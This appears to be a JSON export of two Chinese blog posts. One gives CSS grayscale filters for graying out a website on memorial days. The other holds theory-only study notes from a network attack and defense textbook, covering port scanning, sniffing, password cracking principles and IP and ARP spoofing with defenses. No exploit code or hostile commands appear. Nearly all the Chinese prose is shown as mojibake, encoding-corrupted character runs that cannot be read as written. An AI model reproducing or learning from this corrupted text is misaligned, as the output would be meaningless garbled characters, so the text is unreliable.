ä¸ºåªæ˜¯ä»Šå¤©å“€æ‚¼çŸ­æš‚ç”¨ä¸€å“ˆï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æ”¾åˆ°äº†`<head>`é‡Œé¢ï¼Œå…¶å®Œæ•´å†…å®¹ä¸ºï¼š\n```html\n<!--æ”¾åˆ°<head></head>ä¹‹é—´å³å¯-->\n  <style type=\"text/css\"> \n\thtml{ \n\tfilter: grayscale(100%); /* æ ‡å‡†å†™æ³• just for IE6-9 */ \n\t-webkit-filter: grayscale(100%); /* webkit å†…æ ¸æ”¯æŒç¨‹åº¦è¾ƒå¥½ */\n\t-moz-filter: grayscale(100%); /* å…¶ä»–å†…æ ¸ç°åœ¨å¹¶ä¸æ”¯æŒï¼Œä¸ºäº†å°†æ¥å…¼å®¹æ€§ä¹¦å†™ */\n\t-ms-filter: grayscale(100%); \n\t-o-filter: grayscale(100%); \n\tfilter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); \n    filter: url(\"data:image/svg+xml;utf8,<svg xmlns=\\'http://www.w3.org/2000/svg\\'><filter id=\\'grayscale\\'><feColorMatrix type=\\'matrix\\' values=\\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\\'/></filter></svg>#grayscale\"); /* Firefox 3.5+ */\n\t}\n</style>\n```\nè¿™ä¸ªå®ç°æ–¹æ³•å…¼å®¹æ€§ä¼šæ›´å¥½ä¸€äº›ã€‚\n\næˆ–è€…ç›´æ¥è°ƒç”¨åˆ«äººå†™å¥½çš„\n```html\n <link href=\"https://static.isenyu.cn/file/css/MemorialDay.css\"; rel=\"stylesheet\" type=\"text/css\" />\n```\n#### éå…¨ç«™å˜ç°\n\næˆ‘ä»¬å¯ä»¥å°†éœ€è¦ä½¿ç”¨filterçš„å…ƒç´ å•ç‹¬åŠ ä¸Š\n\n```html\n<html>\n    <body>\n        <div class=\"gray-filter\"></div>\n    </body>\n</html>\n\n<style type=\"text/css\">\n.gray-filter {\n    filter: grayscale(100%);\n    -webkit-filter: grayscale(100%);\n    -moz-filter: grayscale(100%);\n    -ms-filter: grayscale(100%);\n    -o-filter: grayscale(100%);\n\tfilter: url(\"data:image/svg+xml;utf8,<svg xmlns=\\'http://www.w3.org/2000/svg\\'><filter id=\\'grayscale\\'><feColorMatrix type=\\'matrix\\' values=\\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\\'/></filter></svg>#grayscale\");\n    filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);\n}\n</style>\n```\n\n#### CSS filter çš„æµè§ˆå™¨å…¼å®¹\n\nChrome31+ï¼ŒSafari7+ï¼ŒOpera20+ï¼Œios Safari6+ï¼ŒAndroid Browser4.4+ï¼ŒBlackberry 10+å‡æ”¯æŒäº†`-webkit-filter `çš„æ–¹å¼ï¼Œ**ä½†æ˜¯IE ä¸æ”¯æŒ**\n\n![image-20200404182351477](https://i.loli.net/2020/04/04/ONPC5MhxbSVanZB.png)\n\nç”¨`IE`æ‰“å¼€å‘ç°ç½‘é¡µå¹¶æ²¡æœ‰å˜ç°ï¼ŒIEæ˜¯ä¸æ”¯æŒ`filterå±æ€§`çš„,ä½†æ˜¯å½±å“å¹¶ä¸å¤§å•¦\n\n![image-20200404182133386](https://i.loli.net/2020/04/04/bFtTHMDI25Ey7Vv.png)\n\nå‚è€ƒï¼š[ä¸€æ®µcssè®©å…¨ç«™å˜ç°çš„ä»£ç æ€»ç»“](https://www.jb51.net/css/718943.html)\nå‚è€ƒï¼š[å›¾åƒç°åº¦(grayscale)å®ç° å„æµè§ˆå™¨å®ç°æ–¹å¼](https://www.lisa33xiaoq.net/1270.html)\nå‚è€ƒï¼š[å¦‚ä½•ç”¨ä¸€è¡Œä»£ç å®ç°ç½‘é¡µå˜ç°æ•ˆæœï¼Ÿ](https://mp.weixin.qq.com/s/oMXiStiTEL5PR61I4OqCbQ)","tags":["CSS","filteræ»¤é•œ"],"categories":["Web"]},{"title":"ã€Šç½‘ç»œæ”»å‡»ä¸é˜²å¾¡æŠ€æœ¯ã€‹å­¦ä¹ ç¬”è®°","url":"/posts/23380.html","content":"\n## å‰è¨€\n\nç”±äºæœ¬æ ¡æ‰€ç”¨æ•™æä¸ºï¼š`å¼ ç‰æ¸…ä¸»ç¼–ï¼Œæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾å‡ºç‰ˆçš„ã€Šç½‘ç»œæ”»å‡»ä¸é˜²å¾¡æŠ€æœ¯ã€‹`ï¼Œå› æ­¤æœ¬æ–‡æ˜¯åŸºäºæ­¤ä¹¦è¿›è¡Œå­¦ä¹ åŠæ€»ç»“çš„ï¼Œæœ¬æ–‡ç« ç€é‡äºç†è®ºçŸ¥è¯†ï¼Œæ²¡æœ‰å®æˆ˜åº”ç”¨ã€‚\n\nã€Šç½‘ç»œæ”»å‡»ä¸é˜²å¾¡æŠ€æœ¯ã€‹PDF ä¸‹è½½åœ°å€ï¼š[è“å¥äº‘](https://jwt1399.lanzoui.com/iEPXufgdneb)\n\n## ç¬¬ä¸€ç«  ç½‘ç»œå®‰å…¨æ¦‚è¿°\n\n### 1.ç½‘ç»œå®‰å…¨åŸºç¡€çŸ¥è¯†\n\n#### ç½‘ç»œå®‰å…¨çš„åŸºæœ¬éœ€æ±‚\n\nå¯é æ€§ã€å¯ç”¨æ€§ã€ä¿å¯†æ€§ã€å®Œæ•´æ€§ã€ä¸å¯æŠµèµ–æ€§ã€å¯æ§æ€§ã€å¯å®¡æŸ¥æ€§ã€çœŸå®æ€§\n\n#### ç½‘ç»œå®‰å…¨å†…å®¹\n\n**ç½‘ç»œå®‰å…¨çš„ä¸»ä½“**æ˜¯ä¿æŠ¤ç½‘ç»œä¸Šçš„æ•°æ®å’Œé€šä¿¡çš„å®‰å…¨\n**æ•°æ®å®‰å…¨æ€§**æ˜¯ä¸€ç»„ç¨‹åºå’ŒåŠŸèƒ½ï¼Œç”¨æ¥é˜»æ­¢å¯¹æ•°æ®è¿›è¡Œéæˆæƒçš„æ³„æ¼ã€è½¬ç§»ã€ä¿®æ”¹å’Œç ´å\n**é€šä¿¡å®‰å…¨æ€§**æ˜¯ä¸€äº›ä¿æŠ¤æªæ–½ï¼Œè¦æ±‚åœ¨ç”µä¿¡ä¸­é‡‡ç”¨ä¿å¯†å®‰å…¨æ€§ã€ä¼ è¾“å®‰å…¨æ€§ã€è¾å°„å®‰å…¨æ€§çš„æªæ–½ï¼Œå¹¶ä¾è¦æ±‚å¯¹å…·å¤‡é€šä¿¡å®‰å…¨æ€§çš„ä¿¡æ¯é‡‡å–ç‰©ç†å®Œå…¨æ€§æªæ–½\n\n#### ç½‘ç»œå®‰å…¨çš„ç‰¹å¾\n\nä¿å¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€å¯æ§æ€§\n\n#### æ”»å‡»ç±»å‹\n\n**ä¸»åŠ¨æ”»å‡»**\n\nä¸»åŠ¨æ”»å‡»åŒ…æ‹¬å¯¹æ•°æ®æµè¿›è¡Œç¯¡æ”¹æˆ–ä¼ªé€ æ•°æ®æµå¯åˆ†ä¸º4ç±»:ä¼ªè£…ã€é‡æ”¾ã€æ¶ˆæ¯ç¯¡æ”¹å’Œæ‹’ç»æœåŠ¡ã€‚\n\n**è¢«åŠ¨æ”»å‡»**\n\nè¢«åŠ¨æ”»å‡»é‡‡å–çš„æ–¹æ³•æ˜¯å¯¹ä¼ è¾“ä¸­çš„ä¿¡æ¯è¿›è¡Œçªƒå¬å’Œç›‘æµ‹ï¼Œä¸»è¦ç›®æ ‡æ˜¯è·å¾—ä¼ è¾“çš„ä¿¡æ¯ã€‚æœ‰ä¸¤ç§ä¸»è¦çš„è¢«åŠ¨æ”»å‡»æ–¹å¼:ä¿¡æ¯æ”¶é›†å’Œæµé‡åˆ†æã€‚\n\n**ç¤¾ä¼šå·¥ç¨‹å­¦**\n\n### 2.ç½‘ç»œå®‰å…¨çš„é‡è¦æ€§\n\n- ä¿¡æ¯ç³»ç»Ÿè‡ªèº«å®‰å…¨çš„è„†å¼±æ€§\n\n- ä¿¡æ¯ç³»ç»Ÿé¢ä¸´çš„å®‰å…¨å¨èƒ\n\n- å®‰å…¨ç®¡ç†é—®é¢˜\n\n- é»‘å®¢æ”»å‡»\n\n- ç½‘ç»œçŠ¯ç½ª\n- ä¸ºä»€ä¹ˆä¼šæ„ŸæŸ“æ¶æ„ä»£ç \n\n### 3.ç½‘ç»œå®‰å…¨å¨èƒåŠæ ¹æº\n\n#### ç½‘ç»œå®‰å…¨åŸºæœ¬å¨èƒ\n\n> å®‰å…¨çš„åŸºæœ¬ç›®æ ‡æ˜¯å®ç°ä¿¡æ¯çš„æœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ã€‚å¯¹ä¿¡æ¯ç³»ç»Ÿè¿™ä¸‰ä¸ªåŸºæœ¬ç›®æ ‡çš„å¨èƒå°±æ˜¯åŸºæœ¬å¨èƒ\n\n- ä¿¡æ¯æ³„éœ²ï¼šæ•æ„Ÿæ•°æ®è¢«æ³„éœ²ç»™æœªæˆæƒå®ä½“\n- å®Œæ•´æ€§ç ´åï¼šé€šè¿‡æœªæˆæƒçš„åˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤å’Œé‡æ”¾\n- æ‹’ç»æœåŠ¡ï¼šç³»ç»Ÿè¢«åˆ©ç”¨ï¼Œé€ æˆæœåŠ¡èƒ½åŠ›ä¸‹é™æˆ–ä¸§å¤±\n\n1. å—åˆ°æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡å¯¹ç³»ç»Ÿè¿›è¡Œéæ³•çš„è®¿é—®å°è¯•è€Œäº§ç”Ÿè¿‡é‡çš„ç³»ç»Ÿè´Ÿè½½ï¼Œä»è€Œå¯¼è‡´ç³»ç»Ÿçš„èµ„æºå¯¹åˆæ³•ç”¨æˆ·çš„æœåŠ¡èƒ½åŠ›ä¸‹é™æˆ–ä¸§å¤±\n\n2. ä¿¡æ¯ç³»ç»Ÿæˆ–ç»„ä»¶åœ¨ç‰©ç†ä¸Šå—åˆ°ç ´åè€Œä¸­æ–­æœåŠ¡\n\n- æœªæˆæƒæœåŠ¡ï¼šæœªæˆæƒå®ä½“éæ³•è®¿é—®ç³»ç»Ÿèµ„æºæˆ–æˆæƒç”¨æˆ·è¶…è¶Šæƒé™è®¿é—®èµ„æº\n\n#### å¨èƒç³»ç»Ÿçš„ä¸»è¦æ–¹æ³•\n\nå†’å……ã€ç ´åä¿¡æ¯çš„å®Œæ•´æ€§ã€ç ´åç³»ç»Ÿçš„å¯ç”¨æ€§\n\né‡æ”¾ã€è¾å°„ä¾¦æµ‹ã€åé—¨ã€æœ¨é©¬ã€æŠµèµ–\n\n#### å¨èƒå­˜åœ¨çš„æ ¹æº\n\n- å†…éƒ¨æ“ä½œä¸å½“\n- å†…éƒ¨ç®¡ç†ä¸ä¸¥\n- æ¥è‡ªå¤–éƒ¨çš„å¨èƒ\n- TCP/IPåè®®æ—çš„æ¼æ´\n  - ARPæ¬ºéª—\n  - SYN FLOODæ”»å‡»\n\n### 4.ç½‘ç»œæ”»å‡»è¿‡ç¨‹\n\n#### å…¥ä¾µç³»ç»Ÿçš„å¸¸ç”¨æ­¥éª¤\n\n![](https://i.loli.net/2020/05/14/YKnzbmkFWg4HyXu.png)\n\n#### è¾ƒé«˜æ˜çš„å…¥ä¾µæ­¥éª¤\n\n![](https://i.loli.net/2020/05/14/Ln7kaQCYID6TNeb.png)\n\n### 5.é˜²æŠ¤æªæ–½\n\n![](https://i.loli.net/2020/05/14/tcQGadoeIqDlPUm.png)\n\n![](https://i.loli.net/2020/05/14/QuoEnlVaUfI6BGD.png)\n\n\n\n## ç¬¬ä¸‰ç«  æ‰«æä¸é˜²å¾¡\n\n### æ‰«æçš„ä¸‰ä¸ªé˜¶æ®µ\n\n**ä¸€ä¸ªå®Œæ•´çš„ç½‘ç»œå®‰å…¨æ‰«æåˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ:**\n\n- `ç¬¬ä¸€é˜¶æ®µ:`å‘ç°ç›®æ ‡ä¸»æœºæˆ–ç½‘ç»œ\n- `ç¬¬äºŒé˜¶æ®µ:`å‘ç°ç›®æ ‡åè¿›ä¸€æ­¥æœé›†ç›®æ ‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿç±»å‹ã€è¿è¡Œçš„æœåŠ¡ä»¥åŠæœåŠ¡è½¯ä»¶çš„ç‰ˆæœ¬ç­‰ã€‚å¦‚æœç›®æ ‡æ˜¯ä¸€ä¸ªç½‘ç»œï¼Œè¿˜å¯ä»¥è¿›ä¸€æ­¥å‘ç°è¯¥ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„ã€è·¯ç”±è®¾å¤‡ä»¥åŠå„ä¸»æœºçš„ä¿¡æ¯\n- `ç¬¬ä¸‰é˜¶æ®µ:` æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯åˆ¤æ–­æˆ–è€…è¿›ä¸€æ­¥æµ‹è¯•ç³»ç»Ÿæ˜¯å¦å­˜åœ¨å®‰å…¨æ¼æ´\n\n### æ‰«ææŠ€æœ¯\n\n#### ä¸»æœºæ‰«æï¼ˆæ¶‰åŠåˆ°çš„åŸç†ï¼‰\n\nå‘ç›®æ ‡ç³»ç»Ÿå‘é€ICMPå›æ˜¾è¯·æ±‚æŠ¥æ–‡ï¼Œå¹¶ç­‰å¾…è¿”å›çš„ICMPå›æ˜¾åº”ç­”ï¼Œç„¶åæ‰“å°å‡ºå›æ˜¾æŠ¥æ–‡ï¼æ”¶åˆ°è¿”å›çš„ICMPæŠ¥æ–‡ï¼Œå°±è¯´æ˜ä¸»æœºå­˜æ´»ã€‚\n\nç›®çš„ï¼šæ‰¾å‡ºç½‘æ®µå†…æ´»è·ƒä¸»æœº\n\n#### ç«¯å£æ‰«æï¼ˆæ¶‰åŠåˆ°çš„åŸç†ï¼‰\n\nç«¯å£æ‰«ææ˜¯é€šè¿‡å‘è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿçš„ TCP ç«¯å£æˆ– UDP ç«¯å£å‘é€æ¶ˆæ¯,è®°å½•ç›®æ ‡ç³»ç»Ÿçš„å“åº”,æœé›†åˆ°å¾ˆå¤šå…³äºç›®æ ‡ä¸»æœºçš„å„ç§æœ‰ç”¨çš„ä¿¡æ¯ã€‚\n\nç›®çš„ï¼šæ‰¾å‡ºä¸»æœºä¸Šæ‰€å¼€æ”¾çš„ç½‘ç»œæœåŠ¡\n\n##### å…¨æ‰«æï¼ˆTCP Connectï¼‰\n\n**ä¼˜ç‚¹ï¼š**ä¸éœ€è¦ä»€ä¹ˆç‰¹æƒï¼Œæ‰€ä»¥å‡ ä¹æ‰€æœ‰çš„ç”¨æˆ·ï¼ˆåŒ…æ‹¬å¤šç”¨æˆ·ç¯å¢ƒä¸‹ï¼‰éƒ½å¯ä»¥é€šè¿‡connec()å‡½æ•°æ¥å®ç°è¿™ä¸ªæ“ä½œ\n\n**ç¼ºç‚¹ï¼š**è¿™ç§æ‰«ææ–¹æ³•ä¼šåœ¨æ—¥å¿—æ–‡ä»¶ä¸­ç•™ä¸‹å¤§é‡å¯†é›†çš„è¿æ¥å’Œé”™è¯¯è®°å½•ï¼Œå¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œå¹¶è¿‡æ»¤æ‰ã€‚\n\n##### åŠæ‰«æï¼ˆTCP SYNæ‰«æï¼‰\n\n**ä¼˜ç‚¹ï¼š**é‡‡ç”¨è¿™ç§ â€œåŠæ‰“å¼€æ‰«æâ€ï¼Œç›®æ ‡ç³»ç»Ÿå¹¶ä¸å¯¹å®ƒè¿›è¡Œç™»è®°ï¼Œ å› æ­¤æ¯”å…¨æ‰«ææ‰«ææ›´éšè”½ã€‚ å³ä½¿æ—¥å¿—ä¸­å¯¹äºæ‰«ææœ‰æ‰€è®°å½•ï¼Œ å¯¹å°è¯•è¿æ¥çš„è®°å½•ä¹Ÿè¦æ¯”å…¨æ‰«æçš„è®°å½•å°‘å¾—å¤šã€‚\n\n**ç¼ºç‚¹ï¼š**ä½†åœ¨å¤§éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¸­ï¼Œå‘é€ä¸»æœºéœ€è¦æ„é€ é€‚ç”¨äºè¿™ç§æ‰«æç±»å‹çš„IPåŒ…ï¼Œ é€šå¸¸åªæœ‰è¶…çº§ç”¨æˆ·æˆ–å¾—åˆ°æˆæƒçš„ç”¨æˆ·æ‰æœ‰æƒé™è®¿é—®ä¸“é—¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œ æ„é€ è¿™ç§ä¸“é—¨çš„SYNæ•°æ®åŒ…ï¼\n\n##### ç§˜å¯†æ‰«æï¼ˆTCP FINæ‰«æï¼‰\n\n**ä¼˜ç‚¹ï¼š**ç”±äºè¿™ç§æŠ€æœ¯ä¸åŒ…å«æ ‡å‡†çš„TCPä¸‰æ¬¡æ¡æ‰‹åè®®çš„ä»»ä½•éƒ¨åˆ†ï¼Œæ— æ³•è¢«è®°å½•ä¸‹æ¥ï¼Œ è¿™æ ·å°±æ¯”SYNæ‰«æè¦éšè”½å¾—å¤šã€‚\n\n**ç¼ºç‚¹ï¼š**ä¸SYNæ‰«æç±»ä¼¼ï¼Œ ç§˜å¯†æ‰«æä¹Ÿè¦ç”¨æˆ·å…·æœ‰ç‰¹æ®Šæƒé™ä»¥æ„é€ IPåŒ…ã€‚ å¦å¤–ï¼Œ ç”±äºè¿™ç§æŠ€æœ¯æ˜¯åˆ©ç”¨äº†æŸäº›æ“ä½œç³»ç»Ÿå®ç°TCP/IPåè®®æ—¶çš„æ¼æ´ï¼Œå› æ­¤ï¼Œå¹¶ä¸æ˜¯å¯¹æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿéƒ½æœ‰æ•ˆï¼Œé€šå¸¸åªåœ¨åŸºäºUNIXçš„TCP/IPåè®®æ ˆä¸Šå¯ä»¥æˆåŠŸåœ°åº”ç”¨ï¼Œè€Œåœ¨Windows NT ç¯å¢ƒä¸‹ï¼Œè¯¥æ–¹æ³•æ— æ•ˆï¼Œ å› ä¸ºä¸è®ºç›®æ ‡ç«¯å£æ˜¯å¦æ‰“å¼€æ“ä½œç³»ç»Ÿéƒ½ä¼šå‘é€RST ã€‚ åˆ©ç”¨è¿™ä¸€ç‚¹\næ¥åŒºåˆ†UNIXå’ŒWindowsNT, ä¹Ÿæ˜¯ååˆ†æœ‰ç”¨çš„ï¼\n\n#### è¿œç¨‹ä¸»æœºOSæŒ‡çº¹è¯†åˆ«ï¼ˆæ¶‰åŠåˆ°çš„åŸç†ï¼‰\n\nè¯†åˆ«ä¸»æœºå®‰è£…çš„æ“ä½œç³»ç±»å‹ï¼Œä»¥é€‰æ‹©ä¸åŒæ¸—é€æ”»å‡»ä»£ç åŠé…ç½®\n\n#### æ¼æ´æ‰«æï¼ˆæ¶‰åŠåˆ°çš„åŸç†ï¼‰\n\næ‰¾å‡ºä¸»æœº/ç½‘ç»œæœåŠ¡ä¸Šæ‰€å­˜åœ¨çš„å®‰å…¨æ¼æ´ï¼Œä½œä¸ºç ´è§£é€šé“\n\n### æ‰«æçš„é˜²å¾¡\n\n#### åæ‰«ææŠ€æœ¯çš„åŸç†\n\n- æ˜¯é’ˆå¯¹æ‰«ææŠ€æœ¯æå‡ºçš„\n- æ‰«ææŠ€æœ¯ä¸€èˆ¬åˆ†ä¸ºä¸»åŠ¨æ‰«æå’Œè¢«åŠ¨æ‰«æï¼Œå…±åŒç‚¹åœ¨äºåœ¨å…¶æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œéƒ½éœ€è¦ä¸å—å®³ä¸»æœºäº’é€šæ­£å¸¸\n\n#### ä¸»åŠ¨æ‰«æ\n\n- ä¸»åŠ¨å‘ç›®æ ‡æœºå‘é€å„ç§æ¢æµ‹åŒ…ï¼Œæ ¹æ®å…¶å›åº”åˆ¤æ–­æ‰«æç»“æœ\n- é˜²èŒƒï¼š\n  - å‡å°‘å¼€æ”¾ç«¯å£ï¼Œåšå¥½ç³»ç»Ÿé˜²æŠ¤\n  - å®æ—¶ç›‘æµ‹æ‰«æï¼ŒåŠæ—¶åšå‡ºå‘Šè­¦\n  - ä¼ªè£…çŸ¥åç«¯å£ï¼Œè¿›è¡Œä¿¡æ¯æ¬ºéª—\n\n#### è¢«åŠ¨æ‰«æ\n\nä¸ç›®æ ‡æœºå»ºç«‹æ­£å¸¸è¿æ¥ï¼Œå‘é€çš„æ•°æ®åŒ…ä¹Ÿå±äºæ­£å¸¸èŒƒç•´ï¼Œè¢«åŠ¨æ‰«æä¸ä¼šå‘å—å®³ä¸»æœºå‘é€å¤§è§„æ¨¡çš„æ¢æµ‹æ•°æ®ï¼Œå› æ­¤é˜²èŒƒæ–¹æ³•è¾ƒéš¾ï¼Œç›®å‰åªèƒ½é‡‡ç”¨`ä¿¡æ¯æ¬ºéª—`æ–¹æ³•\n\n#### é˜²ç«å¢™æŠ€æœ¯\n\n#### å®¡è®¡æŠ€æœ¯\n\n## ç¬¬å››ç«  ç½‘ç»œå—…æ¢ä¸é˜²å¾¡\n\n### ç›‘å¬çš„æ¦‚å¿µ\n\n- åˆåç½‘ç»œå—…æ¢ï¼Œæ˜¯ä¸€ç§åœ¨ä»–æ–¹æœªå¯Ÿè§‰çš„æƒ…å†µä¸‹æ•è·å…¶é€šä¿¡æŠ¥æ–‡æˆ–é€šä¿¡å†…å®¹çš„æŠ€æœ¯\n- ç½‘ç»œç›‘å¬æ˜¯ä¸€æŠŠåŒåˆƒå‰‘ï¼Œå¯¹äºæ”»é˜²åŒæ–¹éƒ½æœ‰é‡è¦çš„æ„ä¹‰\n- ç½‘ç»œç›‘å¬æŠ€æœ¯çš„èƒ½åŠ›èŒƒå›´åªé™äºå±€åŸŸç½‘ï¼Œä¸»æœºå¯ä»¥æ¥æ”¶åˆ°æœ¬ç½‘æ®µåœ¨åŒä¸€æ¡ç‰©ç†é€šé“ä¸Šä¼ è¾“çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œä¸ç®¡è¿™äº›çš„å‘é€æ–¹å’Œæ¥æ”¶æ–¹æ˜¯è°\n\n### ç›‘å¬çš„æŠ€æœ¯\n\n- å…±äº«å¼å±€åŸŸç½‘çš„ç›‘å¬æŠ€æœ¯åŠåŸç†\n\n- äº¤æ¢å¼å±€åŸŸç½‘çš„ç›‘å¬æŠ€æœ¯åŠåŸç†\n\n### ç›‘å¬çš„é˜²å¾¡\n\n- å®‰å…¨çš„æ‹“æ‰‘ç»“æ„\n\n- æ•°æ®åŠ å¯†ï¼ˆSSLã€VPNï¼‰\n\n- å…±äº«å¼ç½‘ç»œä¸‹çš„é˜²ç›‘å¬\n  - ç½‘ç»œå’Œä¸»æœºå“åº”æ—¶é—´æµ‹è¯•\n\n  - ARPæ£€æµ‹ï¼ˆæ£€æµ‹å¯¹æ–¹æ˜¯å¦åœ¨æ··æ‚æ¨¡å¼ä¸‹ï¼‰\n\n- äº¤æ¢å¼ç½‘ç»œä¸‹çš„é˜²ç›‘å¬\n  - é˜²æ­¢ARPæ¬ºéª—          \n\n## ç¬¬äº”ç«  å£ä»¤ç ´è§£\n\n### å£ä»¤çš„å¼±ç‚¹\n\n- å£ä»¤è¿‡äºç®€å•ï¼Œå®¹æ˜“è¢«äººçŒœå‡ºæ¥\n- å£ä»¤è¿‡äºå¤æ‚ï¼Œç”¨æˆ·å¾€å¾€éœ€è¦æŠ„ä¸‹æ¥ï¼ˆä¸å¥½è®°å¿†ï¼‰ï¼Œè¿™æ ·ä½¿å¾—å£ä»¤åè€Œæ›´ä¸å®‰å…¨\n- å®‰å…¨æ€§ä»…ä¾èµ–äºå£ä»¤\n- å£ä»¤å¯è¢«è¿›è¡Œå­—å…¸å¼æ”»å‡»\n\n### å»ºç«‹å£ä»¤éµå¾ªçš„è§„åˆ™\n\n1ã€ä¸ä½¿ç”¨å’Œç”¨æˆ·åç›¸åŒçš„å£ä»¤\n\n2ã€ä¸ä½¿ç”¨æ—¥æœŸå£ä»¤\n\n3ã€ä¸ä½¿ç”¨è‹±æ–‡å•è¯\n\n4ã€å°½é‡é€‰æ‹©é•¿çš„å£ä»¤\n\n5ã€ç»å¸¸æ›´æ¢å£ä»¤\n\n6ã€ä¸ä½¿ç”¨æœ‰è‡ªå·±ç›¸å…³ä¿¡æ¯çš„å£ä»¤\n\n### å­—å…¸æ”»å‡»åŸç†\n\nå­—å…¸æ”»å‡»ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªåŒ…å«å¤§å¤šæ•°è¯å…¸å•è¯çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è¿™äº›å•è¯æ¥çŒœæµ‹å£ä»¤\n\n### å¦‚ä½•å¯¹å£ä»¤è¿›è¡Œç ´è§£ï¼ˆå£ä»¤ç ´è§£å·¥å…·çš„åŸç†ï¼‰\n\n**å£ä»¤ç ´è§£æ–¹å¼ï¼š**\n\nè¯å…¸æ”»å‡»ã€å¼ºè¡Œæ”»å‡»ã€ç»„åˆæ”»å‡»ç­‰\n\n**å£ä»¤ç ´è§£å·¥å…·çš„åŸç†ï¼š**\n\n![](https://img.jwt1399.top//img/20200809194307.png)\n\nå£ä»¤ç ´è§£å™¨é€šå¸¸ç”±å€™é€‰å£ä»¤äº§ç”Ÿå™¨ ã€ å£ä»¤åŠ å¯†æ¨¡å—å’Œå£ä»¤æ¯”è¾ƒæ¨¡å—ç»„æˆã€‚ \n\nå€™é€‰å£ä»¤äº§ç”Ÿå™¨ç”¨æ¥äº§ç”Ÿè®¤ä¸ºå¯èƒ½æ˜¯å£ä»¤çš„å•è¯ï¼Œ åœ¨å£ä»¤åŠ å¯†æ¨¡å—ï¼Œ ä½¿ç”¨çŸ¥é“çš„åŠ å¯†ç®—æ³•å¯¹å€™é€‰å£ä»¤åŠ å¯†ï¼Œ å°†åŠ å¯†åçš„å€™é€‰å£ä»¤å¯†æ–‡ä¸å®é™…å£ä»¤çš„å¯†æ–‡ä¸€èµ·é€åˆ°å£ä»¤æ¯”è¾ƒæ¨¡å—è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´ï¼Œ é‚£ä¹ˆï¼Œå½“å‰å€™é€‰å£ä»¤å‘ç”Ÿå™¨ä¸­é€å‡ºæ¥çš„å•è¯å°±æ˜¯è¦å¯»æ‰¾çš„å£ä»¤ï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œ é‚£ä¹ˆå€™é€‰å£ä»¤äº§ç”Ÿå™¨å†ç”Ÿæˆä¸‹ä¸€ä¸ªå€™é€‰å£ä»¤ã€‚\n\n## ç¬¬å…­ç«  æ¬ºéª—æ”»å‡»\n\n### IPæ¬ºéª—\n\n#### ä»€ä¹ˆæ˜¯IPæ¬ºéª—ï¼Ÿ\n\nTCP/IPç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªæ•°æ®åŒ…éƒ½åŒ…å«æºä¸»æœºå’Œç›®çš„ä¸»æœºçš„IPåœ°å€ï¼Œ æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å…¶ä»–ä¸»æœºçš„IPåœ°å€ï¼Œäº•å‡è£…è‡ªå·±æ¥è‡ªè¯¥ä¸»æœºï¼Œä»¥è·å¾—è‡ªå·±æœªè¢«æˆæƒè®¿é—®çš„ä¿¡æ¯ã€‚ è¿™ç§ç±»å‹çš„æ”»å‡»ç§°ä¸ºIPæ¬ºéª—\n![](https://i.loli.net/2020/03/31/CJxP7R1yMiLmZ8E.png)\n\n#### åŸºæœ¬çš„IPæ¬ºéª—æŠ€æœ¯\n\n- åŸºæœ¬åœ°å€å˜åŒ–\n- ä½¿ç”¨æºç«™é€‰è·¯æˆªå–æ•°æ®åŒ…\n- åˆ©ç”¨ä¿¡ä»»å…³ç³»\n\n#### IPæ¬ºéª—é«˜çº§åº”ç”¨â€”TCPä¼šè¯åŠ«æŒ\n\n![](https://i.loli.net/2020/03/31/5RJ1XALFi2nIHao.png)\n\n### ARPæ¬ºéª—\n\n#### åŸç†\n\né€šè¿‡è™šå‡è¯·æ±‚æˆ–å“åº”æŠ¥æ–‡ï¼Œä½¿å¾—å…¶ä»–ä¸»æœºçš„ARPåˆ—è¡¨å‘ç”Ÿæ”¹å˜è€Œæ— æ³•æ­£å¸¸é€šä¿¡çš„æ”»å‡»è¡Œä¸ºã€‚\n\n#### å¦‚ä½•å®æ–½\n\né€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€å®ç°ARPæ¬ºéª—ï¼Œèƒ½å¤Ÿåœ¨ç½‘ç»œä¸­äº§ç”Ÿå¤§é‡çš„ARPé€šä¿¡é‡ä½¿ç½‘ç»œé˜»å¡ï¼Œæ”»å‡»è€…åªè¦æŒç»­ä¸æ–­çš„å‘å‡ºä¼ªé€ çš„ARPå“åº”åŒ…å°±èƒ½æ›´æ”¹ç›®æ ‡ä¸»æœºARPç¼“å­˜ä¸­çš„IP-MACæ¡ç›®ï¼Œé€ æˆç½‘ç»œä¸­æ–­æˆ–ä¸­é—´äººæ”»å‡»ã€‚\n\n#### é˜²èŒƒ\n\n1.MACåœ°å€ç»‘å®šã€‚ ä½¿ç½‘ç»œä¸­æ¯ä¸€å°è®¡ç®—æœºçš„lPåœ°å€ä¸ç¡¬ä»¶åœ°å€ä¸€ä¸€å¯¹åº”ï¼Œ ä¸å¯æ›´æ”¹ï¼\n2.ä½¿ç”¨é™æ€ARPç¼“å­˜ã€‚ 